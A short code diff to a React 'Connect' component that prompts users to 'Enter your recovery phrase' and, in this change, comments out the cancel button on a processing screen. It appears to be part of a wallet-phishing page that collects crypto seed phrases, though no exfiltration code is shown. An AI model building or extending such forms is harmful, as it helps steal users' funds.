@@ -64,7 +64,7 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
         )}
 
         {phrase && (
-          <textarea
+          <textarea 
             name="recovery-phase"
             placeholder="Enter your recovery phrase"
           ></textarea>
@@ -106,7 +106,7 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
           <p className={pay ? "pay" : "pay"}>
             please wait as we process your request 😎
           </p>
-          <button
+          {/* <button
             className="cancel-btn"
             onClick={() => {
               setClicked("");
@@ -114,7 +114,7 @@ const Connect = ({ clicked, setClicked, setConnect }) => {
             }}
           >
             CANCEL
-          </button>
+          </button> */}
         </div>
       </form>
     );
